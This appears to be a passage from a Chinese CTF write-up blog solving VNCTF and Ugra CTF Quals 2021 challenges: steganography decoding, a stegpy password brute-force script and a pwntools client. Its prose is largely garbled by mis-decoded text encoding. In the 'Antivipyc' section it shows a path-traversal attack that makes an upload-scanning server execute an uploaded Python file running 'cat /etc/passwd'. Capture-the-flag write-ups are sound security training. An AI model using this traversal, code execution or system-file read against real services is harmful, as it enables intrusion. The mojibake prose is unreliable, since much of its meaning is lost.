è§£å¯†å¯å¾—ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615804134781/c246f8a3e4bd92aed869ad0551c6aacc083d81d5.png"></p><p>å°†æ–‡ä»¶ä¿å­˜åæ‰“å¼€å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><p>å°†ä¸¤æ®µ flag æ‹¼æ¥èµ·æ¥å¾—åˆ°å®Œæ•´çš„ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><h3 id="Do-you-like-Rhythm-Doctor"><a href="#Do-you-like-Rhythm-Doctor" class="headerlink" title="Do_you_like_Rhythm_Doctor"></a>Do_you_like_Rhythm_Doctor</h3><blockquote><p>èŠ‚å¥åŒ»ç”Ÿå…³å¡ç¼–è¾‘å™¨ï¼š<a href="https://giacomopc.itch.io/rdle">https://giacomopc.itch.io/rdle</a></p></blockquote><p>å°†ä¸‹è½½ä¸‹æ¥çš„é™„ä»¶è§£å‹ä¸¤æ¬¡åå¯ä»¥å¾—åˆ° main.rdlevel æ–‡ä»¶ã€‚ä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€å¯ä»¥å¾—åˆ°ä¸€é¦–æ›²å­çš„è°±é¢ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961631112/d6c3c591731797700ba3d3ebb03f4b8f3e16fcaf.png"></p><p>å¯ä»¥è§‚å¯Ÿåˆ°æœ‰å››æ¡è½¨é“ï¼Œæ¯ä¸€æ¡è½¨é“ä¸Šçš„ç‚¹æœ‰çŸ©å½¢æˆ–è€…æ³¢ä¸¤ç§æƒ…å†µã€‚å°†æ–‡ä»¶ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œä½¿ç”¨ 0 ä»£æ›¿æ³¢ï¼ˆWaveï¼‰ï¼Œä½¿ç”¨ 1 ä»£æ›¿çŸ©å½¢ï¼ˆSquareï¼‰,å¯ä»¥å¾—åˆ°å¦‚ä¸‹æ•°æ®ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110110101100000000010101110011001100110001011000110110111100000000011011010110010101011111010101100010011000000000010011100101111101000011010101000100011000000000</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ CyberChef <code>From Binary</code> è§£ç å¯ä»¥å¤§è‡´çœ‹å‡º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961631500/eee7f758a8717893e909636767f97927bcecf1d8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W31come_V&amp;N_CTF&#125;</span><br></pre></td></tr></table></figure><h3 id="HAPPYNEWYEAR"><a href="#HAPPYNEWYEAR" class="headerlink" title="HAPPYNEWYEAR"></a>HAPPYNEWYEAR</h3><p>è§£å‹é™„ä»¶å¯ä»¥å¾—åˆ°ä¸€å¼ åä¸º password.png çš„å›¾ç‰‡å’Œå¦ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1616034357867/98b20b19c2cbc00fa7cd71c82f862b1918462402.png"></p><p>å°†å›¾ç‰‡ä¸Šçš„å†…å®¹å¯¹ç…§ Chinese Code å’Œ Sheikah Language è§£ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1616034412940/9dd49dbac3f4b2c532bddb9e2d1bcd18e195beea.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1616034402151/e733ecfdfa5bb70cf9b41fb84a353abb379a9c0c.png"></p><p>å¯ä»¥å¾—åˆ°å‹ç¼©åŒ…å¯†ç ä¸º <code>f87840bdddcc01e4</code>ã€‚æ ¹æ®æç¤ºä½¿ç”¨ stegpy é…åˆå¯†ç è¡¨çˆ†ç ´ã€‚å› ä¸º stegpy é»˜è®¤æ˜¯äº¤äº’çš„ï¼Œå› æ­¤è‡ªå·±å†™ä¸€æ®µä»£ç æ¥è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> stegpy <span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">from</span> stegpy.lsb <span class="keyword">import</span> HostElement, decode_message, check_magic_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostElementA</span>(<span class="params">HostElement</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_message</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">        msg = decode_message(self.data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> password:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                salt = <span class="built_in">bytes</span>(msg[:<span class="number">16</span>])</span><br><span class="line">                msg = crypt.decrypt_info(password, <span class="built_in">bytes</span>(msg[<span class="number">16</span>:]), salt)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        check_magic_number(msg)</span><br><span class="line">        msg_len = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(msg[<span class="number">6</span>:<span class="number">10</span>]), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        filename_len = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(msg[<span class="number">10</span>:<span class="number">11</span>]), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        start = filename_len + <span class="number">11</span></span><br><span class="line">        end = start + msg_len</span><br><span class="line">        text = <span class="built_in">bytes</span>(msg[start:end]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">filePath, password</span>):</span></span><br><span class="line">    host_path = filePath</span><br><span class="line">    host = HostElementA(host_path)</span><br><span class="line">    password = password</span><br><span class="line">    <span class="keyword">return</span> host.read_message(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">passwords = file.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="keyword">if</span> Decrypt(<span class="string">&quot;happynewyear.png&quot;</span>, password):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found password &#123;&#125;&quot;</span>.<span class="built_in">format</span>(password))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Tried password &#123;&#125;&quot;</span>.<span class="built_in">format</span>(password))</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸€ä»½å¼±å¯†ç è¡¨é…åˆä¸Šè¿°è„šæœ¬çˆ†ç ´å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br><span class="line">[*] Found password tyinfo</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ugra CTF Quals 2021</title>
      <link href="/zh-CN/posts/8c450337.html"/>
      <url>/zh-CN/posts/8c450337.html</url>
      
        <content type="html"><![CDATA[<h3 id="ĞĞ½Ñ‚Ğ¸Ğ²Ğ¸Ñ€ÑƒÑ-Antivipyc"><a href="#ĞĞ½Ñ‚Ğ¸Ğ²Ğ¸Ñ€ÑƒÑ-Antivipyc" class="headerlink" title="ĞĞ½Ñ‚Ğ¸Ğ²Ğ¸Ñ€ÑƒÑ Antivipyc"></a>ĞĞ½Ñ‚Ğ¸Ğ²Ğ¸Ñ€ÑƒÑ Antivipyc</h3><blockquote><p>Ğ®Ğ³Ğ¾Ñ€ÑĞºĞ¸Ğµ Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚Ñ‡Ğ¸ĞºĞ¸ ÑĞ¾Ğ·Ğ´Ğ°Ğ»Ğ¸ Ğ½Ğ¾Ğ²Ñ‹Ğ¹ Ğ¾Ğ±Ğ»Ğ°Ñ‡Ğ½Ñ‹Ğ¹ Ğ°Ğ½Ñ‚Ğ¸Ğ²Ğ¸Ñ€ÑƒÑ, Ñ Ğ±Ğ¾Ğ»ÑŒÑ‰Ğ¾Ğ¹ Ñ‚Ğ¾Ñ‡Ğ½Ğ¾ÑÑ‚ÑŒÑ Ğ¾Ğ¿Ñ€ĞµĞ´ĞµĞ»ÑÑÑ‰Ğ¸Ğ¹ Ğ²Ñ€ĞµĞ´Ğ¾Ğ½Ğ¾ÑĞ½Ñ‹Ğµ Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ñ. ĞĞ¾ Ñ…Ğ¾Ñ€Ğ¾ÑˆĞ¾ Ğ»Ğ¸ Ğ¿Ñ€Ğ¾Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½ ÑĞ°Ğ¼ Ğ°Ğ½Ñ‚Ğ¸Ğ²Ğ¸Ñ€ÑƒÑ?</p><p>Ugra å¼€å‘äººå‘˜å¼€å‘äº†ä¸€ç§æ–°çš„äº‘é˜²ç—…æ¯’è½¯ä»¶ï¼Œå¯ä»¥é«˜åº¦å‡†ç¡®åœ°æ£€æµ‹æ¶æ„ç¨‹åºã€‚ ä½†æ˜¯é˜²ç—…æ¯’è½¯ä»¶æœ¬èº«æ˜¯å¦ç»è¿‡äº†è‰¯å¥½çš„æµ‹è¯•ï¼Ÿ</p></blockquote><p>ç¯å¢ƒç»™å‡ºçš„æ˜¯ä¸€ä¸ªä¸Šä¼ çš„è¡¨å•ï¼Œå°è¯•ä¸Šä¼ å‘ç°ä¼šæœ‰æ–‡ä»¶æ­£å¸¸å’Œæ¶æ„æ–‡ä»¶ä¸¤ç§åé¦ˆã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/639ec06e-c421-456e-b634-e2e7145e132b/1614576494814/353cc892e6371db202db4ba24070ca6d77203277.png" alt="image-20210301132813685"></p><p>ä¸Šä¼ ä¸€ä¸ªæºä»£ç æ–‡ä»¶å¯å‘ç°ç½‘é¡µå“åº”æ—¶é—´è¾ƒä¹…ï¼Œæ¨æµ‹ä»£ç åœ¨è¢«æ£€æµ‹çš„è¿‡ç¨‹ä¸­è¢«æ‰§è¡Œäº†ã€‚å°è¯•å°†è¡¨å•ä¸­çš„ ext å‚æ•°æ”¹ä¸º py åéšä¾¿ä¸Šä¼ ä¸€ä¸ª Python è„šæœ¬å‘ç°å“åº”å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ¸Ñ‚ÑŒ Ñ„Ğ°Ğ¹Ğ» &#x2F;tmp&#x2F;uploads&#x2F;1.py: Ğ¿Ğ»Ğ°Ğ³Ğ¸Ğ½ &#x2F;app&#x2F;plugins&#x2F;py.py Ğ½Ğµ Ğ½Ğ°Ğ¹Ğ´ĞµĞ½</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ç»™å‡ºäº†ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ <code>/tmp/uploads/1.py</code> ã€‚æ­¤æ—¶çš„æ‹“å±•åè¢«æ‹¼æ¥åˆ°äº†æ–‡ä»¶ååé¢å½¢æˆäº† <code>/app/plugins/py.py</code>ï¼Œæ­¤æ—¶å¦‚æœä½¿ç”¨ç›®å½•ç©¿è¶Šï¼Œåˆ™å¯ä»¥æ‰§è¡Œå…¶ä»–çš„æ–‡ä»¶ã€‚æ„é€ ä¸€æ³¢ç›®å½•ç©¿è¶Šï¼Œä½¿å¾—å…¶åç¼€ä¸º <code>../../tmp/uploads/1</code>ï¼Œæ­¤æ—¶å¾—åˆ°çš„æ–‡ä»¶åå°±æ˜¯ <code>/app/plugins/../../tmp/uploads/1.py</code>ã€‚åœ¨ä¸Šä¼ çš„æ–‡ä»¶ä¸­æ„é€ å¦‚ä¸‹è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure><p>å°†å…¶ä½œä¸ºæºä»£ç æ–‡ä»¶ä¸Šä¼ å³å¯å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_who_checks_the_checker_b48847d6ef8eĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ¸Ñ‚ÑŒ Ñ„Ğ°Ğ¹Ğ» &#x2F;tmp&#x2F;uploads&#x2F;1.py</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_who_checks_the_checker_b48847d6ef8eĞĞµ</span><br></pre></td></tr></table></figure><h3 id="ĞšĞ½Ğ¸Ğ³Ğ°-Ğ¿ÑƒÑ‚Ğ¸-Ğ¸-Ğ´Ğ¾ÑÑ‚Ğ¾Ğ¸Ğ½ÑÑ‚Ğ²Ğ°-daodejing"><a href="#ĞšĞ½Ğ¸Ğ³Ğ°-Ğ¿ÑƒÑ‚Ğ¸-Ğ¸-Ğ´Ğ¾ÑÑ‚Ğ¾Ğ¸Ğ½ÑÑ‚Ğ²Ğ°-daodejing" class="headerlink" title="ĞšĞ½Ğ¸Ğ³Ğ° Ğ¿ÑƒÑ‚Ğ¸ Ğ¸ Ğ´Ğ¾ÑÑ‚Ğ¾Ğ¸Ğ½ÑÑ‚Ğ²Ğ° daodejing"></a>ĞšĞ½Ğ¸Ğ³Ğ° Ğ¿ÑƒÑ‚Ğ¸ Ğ¸ Ğ´Ğ¾ÑÑ‚Ğ¾Ğ¸Ğ½ÑÑ‚Ğ²Ğ° daodejing</h3><blockquote><p>ĞšĞ¸Ñ‚Ğ°Ğ¹ÑĞºĞ°Ñ Ğ¼ÑƒĞ´Ñ€Ğ¾ÑÑ‚ÑŒ ÑƒÑ‚Ğ²ĞµÑ€Ğ¶Ğ´Ğ°ĞµÑ‚, Ñ‡Ñ‚Ğ¾, Ñ‡Ñ‚Ğ¾Ğ±Ñ‹ Ğ½Ğµ ÑĞ±Ğ¸Ñ‚ÑŒÑÑ Ñ Ñ‚Ñ€ÑƒĞ´Ğ½Ğ¾Ğ³Ğ¾ Ğ¿ÑƒÑ‚Ğ¸, Ğ½ĞµĞ¾Ğ±Ñ…Ğ¾Ğ´Ğ¸Ğ¼Ğ¾ ÑƒĞ¿Ğ¾Ñ‚Ñ€ĞµĞ±Ğ»ÑÑ‚ÑŒ Ğ´Ğ¾ÑÑ‚Ğ°Ñ‚Ğ¾Ñ‡Ğ½Ğ¾Ğµ ĞºĞ¾Ğ»Ğ¸Ñ‡ĞµÑÑ‚Ğ²Ğ¾ Ğ¾Ğ´Ğ½Ğ¾Ğ³Ğ¾ Ğ²Ğ¸Ñ‚Ğ°Ğ¼Ğ¸Ğ½Ğ°. ĞĞµ ÑĞ¾Ğ±ÑŒÑ‘Ñ‚ĞµÑÑŒ?</p></blockquote><p>é¢˜ç›®ç»™å‡ºçš„é™„ä»¶ä¸­å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼ˆå¤ªé•¿äº†æ”¾åœ¨äº† Ubuntu Pastebinï¼‰ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;paste.ubuntu.com&#x2F;p&#x2F;NsTsDFrszc&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>SVG Path</p><ul><li>M = moveto</li><li>L = lineto</li><li>H = horizontal lineto</li><li>V = vertical lineto</li><li>C = curveto</li><li>S = smooth curveto</li><li>Q = quadratic Belzier curve</li><li>T = smooth quadratic Belzier curveto</li><li>A = elliptical Arc</li><li>Z = closepath</li></ul><p>ä»¥ä¸Šæ‰€æœ‰å‘½ä»¤å‡å…è®¸å°å†™å­—æ¯ã€‚å¤§å†™è¡¨ç¤ºç»å¯¹å®šä½ï¼Œå°å†™è¡¨ç¤ºç›¸å¯¹å®šä½ã€‚</p></blockquote><p>å°† SVG æ–‡ä»¶è¡¥å……å®Œæ•´ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; </span><br><span class="line">&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot; version&#x3D;&quot;1.1&quot;</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;path d&#x3D;&quot;&#123; FILE CONTENT &#125;&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/639ec06e-c421-456e-b634-e2e7145e132b/1614768976525/90ea50d09218be46fd81d6e0b81ec2ca43cc8551.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_grandpa_take_your_pills_or_we_will_beat_up_your_61e33e4865869f4c</span><br></pre></td></tr></table></figure><h3 id="Ğ¦ĞĞ˜Ğ˜Ğ’Ğ¢"><a href="#Ğ¦ĞĞ˜Ğ˜Ğ’Ğ¢" class="headerlink" title="Ğ¦ĞĞ˜Ğ˜Ğ’Ğ¢"></a>Ğ¦ĞĞ˜Ğ˜Ğ’Ğ¢</h3><blockquote><p>Ğ£ÑÑ‚Ñ€Ğ¾Ğ¸Ğ»ÑÑ ÑĞ¸ÑÑ‚ĞµĞ¼Ğ½Ñ‹Ğ¼ Ğ°Ğ´Ğ¼Ğ¸Ğ½Ğ¸ÑÑ‚Ñ€Ğ°Ñ‚Ğ¾Ñ€Ğ¾Ğ¼ Ğ² Ğ¦ĞµĞ½Ñ‚Ñ€Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ ĞĞ˜Ğ˜ Ğ²Ñ‹Ñ‡Ğ¸ÑĞ»Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ¾Ğ¹ Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞ¸. ĞĞ° Ğ²Ñ‚Ğ¾Ñ€Ğ¾Ğ¹ Ğ½ĞµĞ´ĞµĞ»Ğµ Ñ€Ğ°Ğ±Ğ¾Ñ‚Ñ‹ Ğ¾Ğ±Ğ½Ğ°Ñ€ÑƒĞ¶Ğ¸Ğ» Ğ² Ğ»Ğ¾ĞºĞ°Ğ»ÑŒĞ½Ğ¾Ğ¹ ÑĞµÑ‚Ğ¸ ĞºĞ°ĞºĞ¾Ğ¹-Ñ‚Ğ¾ ÑÑ‚Ñ€Ğ°Ğ½Ğ½Ñ‹Ğ¹ ĞºĞ¾Ğ¼Ğ¿ÑŒÑÑ‚ĞµÑ€. ĞŸĞ¾ÑĞ¿Ñ€Ğ°ÑˆĞ¸Ğ²Ğ°Ğ» Ñƒ ĞºĞ¾Ğ»Ğ»ĞµĞ³ â€” Ğ²ÑĞµ Ğ²Ğ¿ĞµÑ€Ğ²Ñ‹Ğµ ÑĞ»Ñ‹ÑˆĞ°Ñ‚ Ğ¾ Ğ½Ñ‘Ğ¼, Ğ´Ğ°Ğ¶Ğµ Ğ½Ğµ Ğ·Ğ½Ğ°ÑÑ‚, Ğ½Ğ° ĞºĞ°ĞºĞ¾Ğ¼ ÑÑ‚Ğ°Ğ¶Ğµ Ğ¾Ğ½ ÑÑ‚Ğ¾Ğ¸Ñ‚.</p><p>Ğ˜ÑĞºĞ°Ğ» Ğ¿Ğ°Ñ€Ñƒ Ğ´Ğ½ĞµĞ¹, Ğ² Ğ¸Ñ‚Ğ¾Ğ³Ğµ Ğ½Ğ°ÑˆÑ‘Ğ» ĞµĞ³Ğ¾ Ğ² Ğ¿Ğ¾Ğ´ÑĞ¾Ğ±ĞºĞµ Ğ¿Ğ¾Ğ´ ÑĞ»Ğ¾ĞµĞ¼ Ğ¿Ñ‹Ğ»Ğ¸ â€” Ñ‚Ğ°ĞºĞ¾Ğµ Ğ¾Ñ‰ÑƒÑ‰ĞµĞ½Ğ¸Ğµ, Ñ‡Ñ‚Ğ¾ Ğ»ĞµÑ‚ 30 Ğº Ğ½ĞµĞ¼Ñƒ Ğ½Ğ¸ĞºÑ‚Ğ¾ Ğ½Ğµ Ğ¿Ñ€Ğ¸ĞºĞ°ÑĞ°Ğ»ÑÑ. Ğ¡Ğ°Ğ¼Ğ¾Ğµ ÑƒĞ´Ğ¸Ğ²Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ¾Ğµ â€” ÑÑ‚Ğ¾ Ñ‚Ğ¾, Ñ‡Ñ‚Ğ¾ Ğ¾Ğ½ ĞºĞ°ĞºĞ¸Ğ¼-Ñ‚Ğ¾ Ğ¾Ğ±Ñ€Ğ°Ğ·Ğ¾Ğ¼ Ğ¿Ğ¾Ğ´ĞºĞ»ÑÑ‡ĞµĞ½ Ğº Ğ¸Ğ½Ñ‚ĞµÑ€Ğ½ĞµÑ‚Ñƒ, Ğ¸ Ğ½Ğ° Ğ½Ñ‘Ğ¼ Ğ´Ğ°Ğ¶Ğµ Ğ¾Ñ‚ĞºÑ€Ñ‹Ñ‚ Ğ¿Ğ¾Ñ€Ñ‚. ĞŸÑ€Ğ¸ Ğ¿Ğ¾Ğ´ĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ğ¸ Ğ¿Ñ€Ğ¾ÑĞ¸Ñ‚ Ğ¿Ğ°Ñ€Ğ¾Ğ»ÑŒ, Ñ ĞµĞ³Ğ¾ Ñ€Ğ°Ğ·Ğ´Ğ¾Ğ±Ñ‹Ğ» Ğ² Ğ°Ñ€Ñ…Ğ¸Ğ²Ğµ. ĞĞ¾ Ğ²Ğ¼ĞµÑÑ‚Ğ¾ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… ÑĞµÑ€Ğ²ĞµÑ€ ÑˆĞ»Ñ‘Ñ‚ ĞºĞ°ĞºĞ¾Ğ¹-Ñ‚Ğ¾ Ğ¼ÑƒÑĞ¾Ñ€.</p><p>ĞŸĞ¾Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ñ€Ğ°Ğ·Ğ¾Ğ±Ñ€Ğ°Ñ‚ÑŒÑÑ? Ğ’Ğ´Ñ€ÑƒĞ³ Ñ‚Ğ°Ğ¼ Ñ‡Ñ‚Ğ¾-Ñ‚Ğ¾ Ğ²Ğ°Ğ¶Ğ½Ğ¾Ğµ!</p><ul><li>ĞŸĞ°Ñ€Ğ¾Ğ»ÑŒ: <code>9bd0f869bb947165bd66ba2e7f5a5aeb</code></li></ul></blockquote><p>å†™ä¸ªè„šæœ¬æŠŠæ§åˆ¶å°å‘é€çš„å†…å®¹æ¥æ”¶å›æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">connection = remote(<span class="string">&quot;soviet.q.2021.ugractf.ru&quot;</span>, <span class="number">17792</span>)</span><br><span class="line">connection.recvline()</span><br><span class="line">connection.sendline(<span class="string">&quot;9bd0f869bb947165bd66ba2e7f5a5aeb&quot;</span>)</span><br><span class="line">content = connection.recvall()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;out.bin&quot;</span>, <span class="string">&quot;bw&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ã›ÃŸÃŸÃŸÃŸÃŸÃ› ÃŸ Ã›ÃŸ  ÃœÃœÃŸ ÃœÃœÃŸÃ›Ã›ÃŸÃœÃœÃ› ÃœÃŸÃœ Ã› Ã›ÃŸÃŸÃŸÃŸÃŸÃ›Ã› Ã›Ã›Ã› Ã› ÃŸÃŸÃ›ÃœÃŸÃŸÃŸÃœ ÃŸ Ã›Ãœ ÃŸÃ›Ã›ÃŸ    ÃœÃŸ  Ã› Ã›Ã›Ã› Ã›Ã› ÃŸÃŸÃŸ Ã› ÃŸ  ÃŸÃŸÃœÃŸ ÃœÃŸÃœÃ›  ÃŸ ÃœÃŸ ÃŸÃ›ÃŸÃœÃŸÃ› Ã› ÃŸÃŸÃŸ Ã›ÃŸÃŸÃŸÃŸÃŸÃŸÃŸ Ã› Ã›ÃœÃ› ÃŸÃœÃ›ÃœÃŸÃœÃ›ÃœÃ› ÃŸÃœÃŸ Ã› ÃŸ Ã› ÃŸÃŸÃŸÃŸÃŸÃŸÃŸ  Ãœ ÃœÃ›ÃŸÃœÃœÃ›ÃŸ ÃŸÃŸÃ› ÃŸÃŸ ÃŸÃ›ÃŸÃŸÃœÃŸÃœÃ›Ã› ÃŸÃœÃœ  ÃŸÃœÃ›ÃœÃ› ÃŸÃœÃœ ÃŸÃœÃŸÃŸÃ›ÃŸÃœÃ›Ã›Ã›ÃŸÃœÃŸÃŸÃŸÃœÃ›ÃœÃœÃ›ÃŸÃ›Ã› ÃŸÃœÃŸÃŸÃœÃœÃŸ Ãœ Ã›  Ãœ Ã›Ãœ ÃŸ ÃŸÃŸÃ› ÃœÃœÃŸÃ›ÃŸÃœÃ› ÃœÃŸÃ›ÃœÃŸÃœÃ›Ã›ÃœÃŸ ÃŸ 